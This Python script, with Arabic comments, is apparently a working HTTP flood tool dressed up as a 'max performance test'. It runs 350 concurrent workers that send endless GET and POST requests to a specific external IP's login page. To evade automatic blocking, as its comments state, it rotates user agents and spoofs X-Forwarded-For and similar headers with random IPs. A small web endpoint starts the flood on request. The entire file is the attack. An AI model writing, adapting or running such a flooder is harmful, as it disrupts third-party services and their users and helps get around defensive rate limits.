import asyncio
import aiohttp
from aiohttp import web
import os
import random

TARGET_URL = "http://187.7.17.67/sudani/login2.php"

# ترسانة المتصفحات لتخطي الحظر التلقائي
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
]

PAYLOAD = {'account': '123456789', 'password': 'test_password'}

def generate_random_ip():
    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

# عدادات الإحصائيات الفورية الفائقة
stats = {"success_200": 0, "failed": 0, "total_sent": 0}

async def worker(session, queue):
    while True:
        index = await queue.get()
        random_ip = generate_random_ip()
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'X-Forwarded-For': random_ip,
            'X-Real-IP': random_ip,
            'Client-IP': random_ip,
            'Connection': 'keep-alive'
        }
        
        try:
            # القذف النفاث المتبادل بالتوازي المطلق
            if index % 2 == 0:
                async with session.post(TARGET_URL, data=PAYLOAD, headers=headers, timeout=2) as response:
                    if response.status == 200: stats["success_200"] += 1
                    else: stats["failed"] += 1
            else:
                async with session.get(TARGET_URL, headers=headers, timeout=2) as response:
                    if response.status == 200: stats["success_200"] += 1
                    else: stats["failed"] += 1
        except:
            stats["failed"] += 1
        finally:
            stats["total_sent"] += 1
            queue.task_done()

async def stats_reporter():
    # دالة طباعة الإحصائيات الكلية ثانية بثانية دون تعطيل محرك القذف
    while True:
        await asyncio.sleep(1)
        print(f"⚡ [السرعة القصوى] -> إجمالي المرسل: {stats['total_sent']} | ✅ نجاح 200: {stats['success_200']} | ❌ فشل/حظر: {stats['failed']}", flush=True)

async def run_max_performance_test():
    # تشغيل 350 عامل متوازي يعملون بكامل معالج السيرفر بشكل مستمر ودون توقف
    num_workers = 350  
    queue = asyncio.Queue(maxsize=1000)
    
    # تحسين موصل الشبكة لأعلى معدل قذف لبيانات السيرفر
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, force_close=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        # إطلاق العمال البرمجية في الخلفية
        workers = [asyncio.create_task(worker(session, queue)) for _ in range(num_workers)]
        asyncio.create_task(stats_reporter())
        
        # تغذية طابور المعالجة بالطلبات اللانهائية بأقصى سرعة للمغذي
        index = 0
        while True:
            await queue.put(index)
            index += 1
            if index > 1000000: index = 0

async def handle(request):
    asyncio.create_task(run_max_performance_test())
    return web.Response(text="🚀 تم تشغيل محرك القذف النفاث والطابور اللانهائي بأقصى كفاءة استيعاب! راقب السجلات الآن.")

app = web.Application()
app.router.add_get('/', handle)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 80))
    web.run_app(app, host='0.0.0.0', port=port)
